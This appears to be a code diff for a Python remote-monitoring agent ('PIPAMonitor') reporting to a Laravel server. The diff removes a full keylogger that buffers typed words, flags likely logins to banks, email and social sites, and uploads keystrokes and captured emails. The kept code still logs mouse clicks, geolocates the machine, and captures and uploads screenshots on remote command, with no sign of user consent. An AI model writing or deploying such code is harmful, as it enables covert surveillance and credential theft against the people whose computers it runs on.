@@ -12,7 +12,7 @@ from datetime import datetime
 from PIL import Image, ImageGrab
 import cv2
 import numpy as np
-from pynput import keyboard, mouse
+from pynput import mouse
 from pynput.mouse import Listener as MouseListener
 import re
 import psutil
@@ -33,103 +33,60 @@ class PIPAMonitor:
         self.dados_sistema['notebook_id'] = notebook_id
         self.dados_sistema['status'] = 'ativo'
         
-        # Keylogger inteligente
-        self.keylogger_buffer = ""
-        self.palavra_atual = ""
-        self.historico_palavras = []
-        
         # Históricos
         self.historico_cliques = []
-        self.historico_logins = []  # NOVO: Histórico de logins detectados
-        self.ultimas_palavras = []  # Buffer para palavras consecutivas
-        self.max_palavras_buffer = 10
-        
-        # Padrões para detecção de logins
-        self.padroes_login = {
-            'github': ['github.com', 'login', 'sign in', 'username', 'password', 'git'],
-            'facebook': ['facebook.com', 'fb.com', 'email', 'phone', 'senha'],
-            'google': ['accounts.google.com', 'gmail.com', 'google account'],
-            'outlook': ['outlook.com', 'live.com', 'hotmail.com', 'microsoft account'],
-            'instagram': ['instagram.com', 'insta', 'ig'],
-            'twitter': ['twitter.com', 'x.com', 'tweet'],
-            'linkedin': ['linkedin.com', 'linkedin'],
-            'banco': ['banco', 'bank', 'bancodobrasil', 'itau', 'bradesco', 'santander', 'nubank'],
-            'email': ['email', 'e-mail', 'mail', 'correio'],
-            'whatsapp': ['web.whatsapp.com', 'whatsapp'],
-            'discord': ['discord.com', 'discordapp.com']
-        }
         
         # Controles
         self.monitorando = True
+        self.servidor_online = False
         self.ultima_atividade = datetime.now()
         self.contador_heartbeat = 0
+        self.contador_tentativas = 0
+        self.max_tentativas = 3
         
         # Cache de comandos
         self.comandos_executados = set()
         
         # Listeners
-        self.keyboard_listener = None
         self.mouse_listener = None
         
         print(f"[PIPA] Monitor iniciado - Notebook {notebook_id}")
         print(f"[PIPA] Enviando dados para: {laravel_url}")
 
-    def detectar_possivel_login(self, palavra, aplicativo):
-        """Detecta possíveis tentativas de login"""
-        # Adiciona palavra ao buffer
-        self.ultimas_palavras.append({
-            'palavra': palavra,
-            'aplicativo': aplicativo,
-            'timestamp': datetime.now().isoformat()
-        })
-        
-        # Mantém o buffer limitado
-        if len(self.ultimas_palavras) > self.max_palavras_buffer:
-            self.ultimas_palavras.pop(0)
-        
-        # Verifica padrões de login
-        palavras_texto = ' '.join([p['palavra'] for p in self.ultimas_palavras]).lower()
-        aplicativo_lower = aplicativo.lower()
-        
-        # Verifica se há padrões de serviço
-        servico_detectado = None
-        for servico, padroes in self.padroes_login.items():
-            for padrao in padroes:
-                if padrao in palavras_texto or padrao in aplicativo_lower:
-                    servico_detectado = servico
-                    break
-            if servico_detectado:
-                break
-        
-        # Verifica padrões de email
-        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
-        emails = re.findall(email_pattern, palavras_texto)
-        
-        # Se detectou serviço ou email, registra como possível login
-        if servico_detectado or emails:
-            login_info = {
-                'servico': servico_detectado or 'desconhecido',
-                'aplicativo': aplicativo,
-                'palavras_recentes': [p['palavra'] for p in self.ultimas_palavras],
-                'possivel_email': emails[0] if emails else None,
-                'timestamp': datetime.now().isoformat(),
-                'tipo': 'login_detectado',
-                'confianca': 'alta' if servico_detectado and emails else 'media'
-            }
+    def verificar_conexao_servidor(self):
+        """Verifica se o servidor está online"""
+        try:
+            test_url = f"{self.laravel_url}/api/test"
+            response = requests.get(test_url, timeout=5)
+            if response.status_code == 200:
+                if not self.servidor_online:
+                    print(f"[CONEXAO] Ok Servidor encontrado! Retomando operação...")
+                self.servidor_online = True
+                self.contador_tentativas = 0
+                return True
+        except Exception as e:
+            if self.servidor_online:
+                print(f"[CONEXAO] Servidor offline tentando nova conexão em breve: {e}")
+            self.servidor_online = False
+        return False
+
+    def aguardar_conexao(self):
+        """Aguarda até que o servidor esteja online"""
+        while self.monitorando and not self.verificar_conexao_servidor():
+            self.contador_tentativas += 1
+            print(f"[CONEXAO] Tentativa {self.contador_tentativas} - Reconectando em 20 segundos...")
             
-            self.historico_logins.append(login_info)
-            print(f"🔐 [LOGIN DETECTADO] Serviço: {servico_detectado} | App: {aplicativo}")
-            print(f"📝 Palavras: {login_info['palavras_recentes']}")
-            if emails:
-                print(f"📧 Email detectado: {emails[0]}")
-            
-            # Limpa buffer após detecção
-            self.ultimas_palavras = []
+            # Aguarda 20 segundos ou até interrupção
+            for i in range(20):
+                if not self.monitorando:
+                    return False
+                time.sleep(1)
+        
+        return self.servidor_online
 
     def obter_localizacao(self):
         """Tenta obter localização aproximada via IP"""
         try:
-            # Tenta usar o módulo geocoder se disponível
             try:
                 import geocoder
                 g = geocoder.ip('me')
@@ -145,9 +102,9 @@ class PIPAMonitor:
                         'timestamp': datetime.now().isoformat()
                     }
             except ImportError:
-                print("[LOCALIZACAO] ⚠️ Geocoder não disponível, usando API alternativa")
+                print("[LOCALIZACAO] Geocoder não disponível, usando API alternativa")
             
-            # Fallback para API pública
+            # Fallback para API pública caso não funcione
             response = requests.get('http://ip-api.com/json/', timeout=5)
             if response.status_code == 200:
                 data = response.json()
@@ -165,7 +122,7 @@ class PIPAMonitor:
                     }
                     
         except Exception as e:
-            print(f"[LOCALIZACAO] ❌ Erro: {e}")
+            print(f"[LOCALIZACAO] Erro: {e}")
         
         # Fallback final
         return {
@@ -256,7 +213,7 @@ class PIPAMonitor:
                 'timestamp': datetime.now().isoformat()
             }
         except Exception as e:
-            print(f"[SISTEMA] ❌ Erro: {e}")
+            print(f"[SISTEMA] Erro: {e}")
             return {
                 'hostname': platform.node(),
                 'usuario': getpass.getuser(),
@@ -277,6 +234,9 @@ class PIPAMonitor:
 
     def obter_token_csrf(self):
         """Obtém token CSRF do Laravel"""
+        if not self.servidor_online:
+            return False
+            
         try:
             url = f"{self.laravel_url}/api/csrf-token"
             print(f"[CSRF] Obtendo token CSRF...")
@@ -286,18 +246,22 @@ class PIPAMonitor:
             if response.status_code == 200:
                 data = response.json()
                 self.csrf_token = data.get('csrf_token')
-                print(f"[CSRF] ✅ Token obtido")
+                print(f"[CSRF] Token obtido")
                 return True
             else:
-                print(f"[CSRF] ❌ Erro: {response.status_code}")
+                print(f"[CSRF]  Erro: {response.status_code}")
                 return False
                 
         except Exception as e:
-            print(f"[CSRF] ❌ Erro: {e}")
+            print(f"[CSRF]  Erro: {e}")
             return False
 
     def fazer_requisicao(self, metodo, endpoint, dados=None):
         """Faz requisição com tratamento de CSRF"""
+        if not self.servidor_online:
+            print(f"[REQUISICAO] Servidor offline, requisição cancelada")
+            return None
+            
         url = f"{self.laravel_url}/api{endpoint}"
         
         headers = {
@@ -331,7 +295,7 @@ class PIPAMonitor:
                 if response.status_code != 200:
                     print(f"[REQUISICAO] Erro: {response.text[:200]}")
                 else:
-                    print(f"[REQUISICAO] ✅ Sucesso!")
+                    print(f"[REQUISICAO] Sucesso!")
                     
                 return response
                 
@@ -342,10 +306,11 @@ class PIPAMonitor:
                 raise ValueError(f"Método {metodo} não suportado")
             
         except requests.exceptions.RequestException as e:
-            print(f"[REQUISICAO] ❌ Erro de conexão: {e}")
+            print(f"[REQUISICAO]  Erro de conexão: {e}")
+            self.servidor_online = False
             return None
         except Exception as e:
-            print(f"[REQUISICAO] ❌ Erro inesperado: {e}")
+            print(f"[REQUISICAO]  Erro inesperado: {e}")
             return None
 
     def capturar_screenshot_rapido(self):
@@ -367,68 +332,12 @@ class PIPAMonitor:
             img_str = base64.b64encode(img_buffer.getvalue()).decode()
             
             tamanho_kb = len(img_str) / 1024
-            print(f"[SCREEN] ✅ Capturado - {tamanho_kb:.1f} KB")
+            print(f"[SCREEN] Capturado - {tamanho_kb:.1f} KB")
             return img_str
             
         except Exception as e:
-            print(f"[SCREEN] ❌ Erro: {e}")
+            print(f"[SCREEN] Erro: {e}")
             return None
-
-    def processar_palavra(self, palavra):
-        """Processa palavra completa do keylogger com detecção de logins"""
-        if len(palavra) > 2:  # Ignora palavras muito curtas
-            app_info = self.obter_aplicativo_ativo()
-            aplicativo = app_info.get('nome_processo', 'Desconhecido')
-            
-            palavra_info = {
-                'palavra': palavra,
-                'aplicativo': aplicativo,
-                'timestamp': datetime.now().isoformat()
-            }
-            
-            self.historico_palavras.append(palavra_info)
-            print(f"[PALAVRA] '{palavra}' em {aplicativo}")
-            
-            # NOVO: Detecção de logins
-            self.detectar_possivel_login(palavra, aplicativo)
-
-    def keylogger_on_press(self, key):
-        """Keylogger inteligente - captura palavras completas"""
-        try:
-            self.ultima_atividade = datetime.now()
-            
-            if hasattr(key, 'char') and key.char is not None:
-                tecla = key.char
-                
-                # Se for espaço ou enter, finaliza a palavra
-                if tecla in [' ', '\n', '\r', '\t']:
-                    if self.palavra_atual:
-                        self.processar_palavra(self.palavra_atual)
-                        self.palavra_atual = ""
-                else:
-                    self.palavra_atual += tecla
-                    self.keylogger_buffer += tecla
-                    
-            else:
-                # Teclas especiais
-                tecla = str(key).replace('Key.', '')
-                
-                # Finaliza palavra com teclas especiais
-                if tecla in ['enter', 'tab', 'space'] and self.palavra_atual:
-                    self.processar_palavra(self.palavra_atual)
-                    self.palavra_atual = ""
-                
-                # Backspace - remove último caractere
-                elif tecla == 'backspace':
-                    if self.palavra_atual:
-                        self.palavra_atual = self.palavra_atual[:-1]
-            
-            # Limita buffer
-            if len(self.keylogger_buffer) > 5000:
-                self.keylogger_buffer = self.keylogger_buffer[-4000:]
-                
-        except Exception as e:
-            print(f"[KEYLOG] ❌ Erro: {e}")
 
     def mouse_on_click(self, x, y, button, pressed):
         """Captura cliques do mouse"""
@@ -451,10 +360,14 @@ class PIPAMonitor:
                 print(f"[MOUSE] Clique em ({x}, {y}) em {aplicativo}")
                 
             except Exception as e:
-                print(f"[MOUSE] ❌ Erro: {e}")
+                print(f"[MOUSE] Erro: {e}")
 
     def enviar_heartbeat(self):
-        """Envia heartbeat com localização e logins detectados"""
+        """Envia heartbeat com localização"""
+        if not self.servidor_online:
+            print(f"[HEARTBEAT]  Servidor offline, heartbeat cancelado")
+            return
+            
         try:
             self.contador_heartbeat += 1
             
@@ -470,44 +383,38 @@ class PIPAMonitor:
                 'hostname': self.dados_sistema['hostname'],
                 'sistema_operacional': self.dados_sistema['sistema_operacional'],
                 'info_sistema': self.dados_sistema,
-                'keylog_buffer': self.keylogger_buffer,
-                'historico_palavras': self.historico_palavras[-50:],  # Últimas 50 palavras
                 'historico_cliques': self.historico_cliques[-30:],    # Últimos 30 cliques
-                'historico_logins': self.historico_logins[-20:],      # NOVO: Últimos 20 logins detectados
                 'localizacao': self.dados_sistema.get('localizacao', {}),
                 'timestamp': datetime.now().isoformat()
             }
             
-            print(f"[HEARTBEAT] ✅ #{self.contador_heartbeat} - Localização: {self.dados_sistema.get('localizacao', {}).get('cidade', 'N/A')}")
-            if self.historico_logins:
-                print(f"[HEARTBEAT] 🔐 Logins detectados: {len(self.historico_logins)}")
+            print(f"[HEARTBEAT] #{self.contador_heartbeat} - Localização: {self.dados_sistema.get('localizacao', {}).get('cidade', 'N/A')}")
             
             response = self.fazer_requisicao('POST', '/notebook/heartbeat', heartbeat_data)
             
             if response and response.status_code == 200:
-                print(f"[HEARTBEAT] ✅ Dados enviados com sucesso")
-                # Limpa históricos após envio bem-sucedido (exceto logins)
-                self.historico_palavras = []
+                print(f"[HEARTBEAT] Dados enviados com sucesso")
+                # Limpa histórico após envio bem-sucedido
                 self.historico_cliques = []
-                # Mantém os logins por mais tempo para análise
-                if len(self.historico_logins) > 50:
-                    self.historico_logins = self.historico_logins[-25:]
             else:
                 status = response.status_code if response else 'N/A'
-                print(f"[HEARTBEAT] ❌ Falha: {status}")
+                print(f"[HEARTBEAT] Falha: {status}")
                 
         except Exception as e:
-            print(f"[HEARTBEAT] ❌ Erro: {e}")
+            print(f"[HEARTBEAT]  Erro: {e}")
 
     def verificar_comandos_servidor(self):
         """Verifica comandos do servidor"""
+        if not self.servidor_online:
+            return
+            
         try:
             endpoint = f'/notebook/{self.notebook_id}/comandos'
             response = self.fazer_requisicao('GET', endpoint)
             
             if response and response.status_code == 200:
                 comandos = response.json()
-                print(f"[COMANDOS] 📦 {len(comandos)} comando(s) recebido(s)")
+                print(f"[COMANDOS] {len(comandos)} comando(s) recebido(s)")
                 
                 if comandos:
                     # Filtra comandos já executados
@@ -519,7 +426,7 @@ class PIPAMonitor:
                             self.comandos_executados.add(comando_id)
                     
                     if novos_comandos:
-                        print(f"[COMANDOS] ✅ {len(novos_comandos)} novo(s) comando(s)")
+                        print(f"[COMANDOS] {len(novos_comandos)} novo(s) comando(s)")
                         threading.Thread(
                             target=self.executar_comandos, 
                             args=(novos_comandos,), 
@@ -527,7 +434,7 @@ class PIPAMonitor:
                         ).start()
                     
         except Exception as e:
-            print(f"[COMANDOS] ❌ Erro: {e}")
+            print(f"[COMANDOS] Erro: {e}")
 
     def executar_comandos(self, comandos):
         """Executa comandos recebidos"""
@@ -542,23 +449,23 @@ class PIPAMonitor:
             if acao == 'screenshot':
                 resultado = self.executar_screenshot(comando_id)
             elif acao == 'webcam':
-                print(f"[COMANDOS] ⚠️ Webcam temporariamente desativada")
+                print(f"[COMANDOS] Webcam temporariamente desativada")
             else:
-                print(f"[COMANDOS] ⚠️ Comando desconhecido: {acao}")
+                print(f"[COMANDOS] Comando desconhecido: {acao}")
                 continue
             
             tempo_execucao = time.time() - inicio
-            print(f"[COMANDOS] ✅ {acao} concluído em {tempo_execucao:.1f}s")
+            print(f"[COMANDOS] {acao} concluído em {tempo_execucao:.1f}s")
 
     def executar_screenshot(self, comando_id):
         """Executa screenshot e envia para servidor"""
         try:
-            print(f"[SCREEN] 📸 Iniciando captura...")
+            print(f"[SCREEN] Iniciando captura...")
             
             screenshot = self.capturar_screenshot_rapido()
             
             if not screenshot:
-                print(f"[SCREEN] ❌ Falha na captura")
+                print(f"[SCREEN] Falha na captura")
                 return False
             
             payload = {
@@ -573,50 +480,64 @@ class PIPAMonitor:
             response = self.fazer_requisicao('POST', '/notebook/midia', payload)
             
             if response is None:
-                print(f"[SCREEN] ❌ Nenhuma resposta do servidor")
+                print(f"[SCREEN] Nenhuma resposta do servidor")
                 return False
                 
             if response.status_code == 200:
-                print(f"[SCREEN] ✅ Screenshot enviado com sucesso!")
+                print(f"[SCREEN] Screenshot enviado com sucesso!")
                 return True
             else:
-                print(f"[SCREEN] ❌ Erro HTTP {response.status_code}")
+                print(f"[SCREEN] Erro HTTP {response.status_code}")
                 return False
                 
         except Exception as e:
-            print(f"[SCREEN] ❌ Erro: {e}")
+            print(f"[SCREEN] Erro: {e}")
             return False
 
     def heartbeat_loop(self):
-        """Loop principal"""
+        """Loop principal com reconexão automática"""
         while self.monitorando:
             try:
-                self.enviar_heartbeat()
-                self.verificar_comandos_servidor()
+                # Verifica se o servidor está online
+                if not self.servidor_online:
+                    print(f"[PIPA] Verificando conexão com servidor...")
+                    if self.aguardar_conexao():
+                        # Reconectou, obtém novo token CSRF
+                        self.obter_token_csrf()
+                
+                # Se servidor online, executa operações normais
+                if self.servidor_online:
+                    self.enviar_heartbeat()
+                    self.verificar_comandos_servidor()
+                    time.sleep(30)  # Intervalo normal entre heartbeats
+                else:
+                    # Aguarda curto período antes de verificar novamente
+                    time.sleep(5)
+                    
             except Exception as e:
-                print(f"[LOOP] ❌ Erro: {e}")
-            
-            time.sleep(30)
+                print(f"[LOOP] Erro: {e}")
+                time.sleep(10)
 
     def iniciar_monitoramento(self):
         """Inicia monitoramento"""
         print("[PIPA] 🔄 Iniciando configuração...")
         
+        # Aguarda conexão inicial com servidor
+        if not self.aguardar_conexao():
+            print("[PIPA] Não foi possível conectar ao servidor inicialmente")
+            return
+        
         if not self.obter_token_csrf():
-            print("[PIPA] ⚠️  Continuando sem CSRF token...")
+            print("[PIPA] Continuando sem CSRF token...")
         
         # Inicia listeners
         try:
-            self.keyboard_listener = keyboard.Listener(on_press=self.keylogger_on_press)
-            self.keyboard_listener.start()
-            
             self.mouse_listener = MouseListener(on_click=self.mouse_on_click)
             self.mouse_listener.start()
             
-            print("[LISTENERS] ✅ Keylogger inteligente iniciado")
-            print("[LISTENERS] 🔐 Detector de logins ativado")
+            print("[LISTENERS] Monitor de mouse iniciado")
         except Exception as e:
-            print(f"[LISTENERS] ❌ Erro: {e}")
+            print(f"[LISTENERS] Erro: {e}")
         
         # Inicia heartbeat
         heartbeat_thread = threading.Thread(target=self.heartbeat_loop)
@@ -625,21 +546,21 @@ class PIPAMonitor:
         
         # Mostra informações iniciais
         localizacao = self.dados_sistema.get('localizacao', {})
-        print(f"[PIPA] ✅ Monitoramento avançado ativo")
-        print(f"[PIPA] 📍 Localização: {localizacao.get('cidade', 'N/A')}, {localizacao.get('estado', 'N/A')}")
-        print(f"[PIPA] 🌐 IP Público: {localizacao.get('ip_publico', 'N/A')}")
-        print(f"[PIPA] 🔐 Monitorando logins em: GitHub, Facebook, Google, Bancos, etc.")
-        print(f"[PIPA] 📡 Aguardando comandos...")
+        print(f"[PIPA] Monitoramento ativo")
+        print(f"[PIPA] Localização: {localizacao.get('cidade', 'N/A')}, {localizacao.get('estado', 'N/A')}")
+        print(f"[PIPA] IP Público: {localizacao.get('ip_publico', 'N/A')}")
+        print(f"[PIPA] Aguardando comandos...")
+        print(f"[PIPA] Reconexão automática ativada (20 segundos)")
         
         try:
             while self.monitorando:
                 time.sleep(1)
         except KeyboardInterrupt:
-            print("\n[PIPA] ⚠️  Encerrando...")
+            print("\n[PIPA] Encerrando...")
             self.monitorando = False
 
 if __name__ == "__main__":
-    LARAVEL_URL = "http://localhost:8000"
+    LARAVEL_URL = "http://192.168.5.38:8000"
     NOTEBOOK_ID = "computador-teste"
     
     # Verifica dependências
@@ -649,32 +570,24 @@ if __name__ == "__main__":
         # Tenta importar geocoder
         try:
             import geocoder
-            print("[DEPENDENCIAS] ✅ Geocoder disponível")
+            print("[DEPENDENCIAS] Geocoder disponível")
         except ImportError:
-            print("[DEPENDENCIAS] ⚠️ Geocoder não instalado, usando API alternativa")
-            print("[DEPENDENCIAS] 💡 Para melhor precisão: pip install geocoder")
+            print("[DEPENDENCIAS] Geocoder não instalado, usando API alternativa")
+            print("[DEPENDENCIAS] Para melhor precisão: pip install geocoder")
         
         if platform.system() == 'Windows':
             try:
                 import win32gui
                 import win32process
-                print("[DEPENDENCIAS] ✅ Módulos Windows disponíveis")
+                print("[DEPENDENCIAS] Módulos Windows disponíveis")
             except ImportError:
-                print("[DEPENDENCIAS] ⚠️ Módulos Windows não instalados")
-                print("[DEPENDENCIAS] 💡 Instale: pip install pywin32")
+                print("[DEPENDENCIAS] Módulos Windows não instalados")
+                print("[DEPENDENCIAS] Instale: pip install pywin32")
         
     except Exception as e:
-        print(f"[DEPENDENCIAS] ❌ Erro: {e}")
+        print(f"[DEPENDENCIAS] Erro: {e}")
     
-    # Testa conexão
-    try:
-        test_url = f"{LARAVEL_URL}/api/test"
-        response = requests.get(test_url, timeout=10)
-        print(f"[INICIO] ✅ Servidor respondendo - Status: {response.status_code}")
-    except Exception as e:
-        print(f"[INICIO] ❌ Não foi possível conectar ao servidor: {e}")
-        exit(1)
-    
-    # Inicia o monitor
+    # Inicia o monitor (não testa conexão inicial pois já tem reconexão automática)
+    print("[INICIO] 🚀 Iniciando monitor PIPA...")
     monitor = PIPAMonitor(LARAVEL_URL, NOTEBOOK_ID)
     monitor.iniciar_monitoramento()
